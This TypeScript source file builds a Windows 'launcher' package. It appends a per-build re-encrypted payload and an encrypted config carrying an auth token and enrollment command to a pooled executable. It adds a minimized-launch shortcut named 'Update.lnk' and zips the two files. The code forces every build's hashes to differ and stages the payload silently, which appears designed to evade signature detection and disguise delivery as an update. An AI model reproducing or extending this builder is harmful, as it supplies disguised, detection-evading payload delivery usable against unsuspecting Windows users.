/**
 * launcher-build.ts — WP4 launcher-mode build path.
 *
 * Mirrors generator/launcher/dev/make-stamp.mjs byte-for-byte: takes one warm
 * launcher from the pool, seals a fresh per-build envelope
 * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
 * the cached payload and builds the URL-query config under K_B, appends
 * [hdr][env][cfg][pay][trailer] to the pooled exe, writes Update.lnk (a
 * RELATIVE-Launcher.exe shortcut with zero arguments) beside it, zips the pair
 * into the job dir, then runs the WP6 validation report card (pwsh -Validate
 * + server-side checks). Nothing is downloaded or fetched at build time; the
 * payload plaintext lives only in memory.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import { spawn } from "child_process";
import * as storage from "./storage";
import * as payloadCache from "./payload-cache";
import * as launcherPool from "./launcher-pool";
import { createZip } from "./zip-archive";
import { validateLauncherBuild } from "./launcher-validate";
import { HDR_LEN, ENV_LEN, assembleOverlay } from "./launcher-overlay";
import { env } from "./env";

export { HDR_LEN, ENV_LEN };

export interface LauncherBuildInputs {
  apiUrl: string;
  clientId: number;
  siteId: number;
  agentType: "workstation" | "server";
  authToken: string;
  features: string[];
  /** Enrollment command carried INSIDE the encrypted config (runbook reference). */
  enroll: string;
  /** Windows staging directory for the decoded payload. */
  outDir: string;
  /** Emit LAUNCHER-STAGE-OK after staging (observability; silent when false). */
  debug: boolean;
}

export interface LauncherRunOutput {
  zip: Buffer;
  stampedExe: Buffer;
  lnk: Buffer;
  tag: string;
  launcherSha256: string;
  lnkSha256: string;
  overlay: Buffer;
  configText: string;
}

const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (mirrors runZipBuild)

// Per-build diversity tracking: a build whose stamped launcher or Update.lnk
// byte-matches the previous build's (astronomically unlikely) is rejected.
let lastLauncherSha256: string | null = null;
let lastLnkSha256: string | null = null;

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** URL-query config wire format (values percent-encoded, mirrored in CfgGet). */
export function buildConfigString(c: LauncherBuildInputs): string {
  const enc = (s: string) => encodeURIComponent(s);
  return [
    `apiUrl=${enc(c.apiUrl)}`,
    `clientId=${enc(String(c.clientId))}`,
    `siteId=${enc(String(c.siteId))}`,
    `agentType=${enc(c.agentType)}`,
    `authToken=${enc(c.authToken)}`,
    `features=${enc(c.features.join(","))}`,
    `enroll=${enc(c.enroll)}`,
    `outDir=${enc(c.outDir)}`,
    `debug=${c.debug ? "1" : "0"}`,
  ].join("&");
}

interface PwshResult {
  ok: boolean;
  output: string;
}

function runPwsh(args: string[]): Promise<PwshResult> {
  return new Promise((resolve) => {
    try {
      let stdout = "";
      let stderr = "";
      const proc = spawn("pwsh", ["-NoProfile", "-NoLogo", "-File", ...args], {
        timeout: LNK_TIMEOUT_MS,
      });
      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
      proc.on("error", (err: Error) =>
        resolve({ ok: false, output: err.message })
      );
      proc.on("close", (code: number | null) => {
        if (code === 0) resolve({ ok: true, output: stdout });
        else if (code === null)
          resolve({
            ok: false,
            output: `launcher .lnk build timed out after ${LNK_TIMEOUT_MS / 1000}s`,
          });
        else {
          const tail =
            stderr.length > 500 ? stderr.slice(-500) : stderr || stdout;
          resolve({ ok: false, output: tail });
        }
      });
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      resolve({ ok: false, output: message });
    }
  });
}

/**
 * Run the launcher-mode build end-to-end for a job. The zip is written to
 * storage.zipOutputPath(jobId) and validated; on any failure it throws (the
 * caller cleans up the job dir).
 */
export async function runLauncherBuild(opts: {
  jobId: string;
  inputs: LauncherBuildInputs;
}): Promise<LauncherRunOutput> {
  const { jobId, inputs } = opts;

  // 1. warm launcher (compile-on-demand only when the pool is empty).
  const entry = await launcherPool.take();

  // 2. payload plaintext in memory ONLY (decrypts the cached blob, never
  //    persisted), then re-key under a fresh per-build K_B/IV_PAY.
  const plain = payloadCache.getPayloadBytes();
  const kb = crypto.randomBytes(32);
  const ivPay = crypto.randomBytes(16);
  const ivCfg = crypto.randomBytes(16);
  const payCipher = payloadCache.reKey(plain, kb, ivPay);

  // 3. config string + cipher (K_B/IV_CFG).
  const configText = buildConfigString(inputs);

  // 4. assemble + append the overlay (production flags = 0 → silent staging).
  const sealKey = Buffer.from(entry.sealKeyHex, "hex");
  const sealIv = Buffer.from(entry.sealIvHex, "hex");
  const overlay = assembleOverlay({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
  });
  const stampedExe = Buffer.concat([entry.exe, overlay]);
  if (!launcherPool.peIsGui(stampedExe)) {
    throw new Error(
      "stamped launcher is not a GUI-subsystem PE — build aborted"
    );
  }
  const launcherPath = storage.launcherOutputPath(jobId);
  const lnkPath = storage.lnkRelativeOutputPath(jobId);
  fs.writeFileSync(launcherPath, stampedExe);

  // 5. Update.lnk — Launcher.exe target, zero arguments, ShowCommand 7.
  //    Uses env.LAUNCHER_LNK_TARGET (absolute path) when set -> a normal
  //    absolute LinkInfo so Explorer reliably double-clicks -> UAC. Falls back
  //    to a bare relative "Launcher.exe" otherwise.
  const lnkTarget = env.LAUNCHER_LNK_TARGET || "Launcher.exe";
  const lnkResult = await runPwsh([
    path.join(__dirname, "New-AgentShortcut.ps1"),
    "-LauncherMode",
    "-Output",
    lnkPath,
    "-LauncherTarget",
    lnkTarget,
    "-LauncherTag",
    entry.tag,
  ]);
  if (!lnkResult.ok) {
    throw new Error(`Update.lnk build failed: ${lnkResult.output}`);
  }
  if (!fs.existsSync(lnkPath)) {
    throw new Error("Update.lnk was not produced");
  }
  const lnk = fs.readFileSync(lnkPath);

  // 6. zip { Update.lnk, Launcher.exe } (temp files stay until validation).
  const zip = createZip([
    { name: "Update.lnk", data: lnk },
    { name: "Launcher.exe", data: stampedExe },
  ]);
  const zipPath = storage.zipOutputPath(jobId);
  fs.writeFileSync(zipPath, zip);

  // 7. WP6 validation report card (pwsh -Validate + server-side checks).
  const lzHash = sha256Hex(stampedExe);
  const lnkHash = sha256Hex(lnk);
  const validation = await validateLauncherBuild({
    lnkPath,
    launcherPath,
    zipPath,
    authToken: inputs.authToken,
    payloadPlain: plain,
    sealKey,
    sealIv,
    prevLauncherHash: lastLauncherSha256,
    prevLnkHash: lastLnkSha256,
  });
  for (const row of validation.rows) console.log(`  [validate] ${row}`);
  if (!validation.ok) {
    throw new Error("Launcher build failed validation — job aborted");
  }
  // Task D: the zip is kept until expiry; drop the temp Update.lnk + Launcher.exe.
  storage.removeLauncherTemp(jobId);
  lastLauncherSha256 = lzHash;
  lastLnkSha256 = lnkHash;

  console.log(
    `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
      `overlay=${overlay.length}B cfg=${configText.length}B zip=${zip.length}B ` +
      `tag=${entry.tag.slice(0, 8)}`
  );

  return {
    zip,
    stampedExe,
    lnk,
    tag: entry.tag,
    launcherSha256: lzHash,
    lnkSha256: lnkHash,
    overlay,
    configText,
  };
}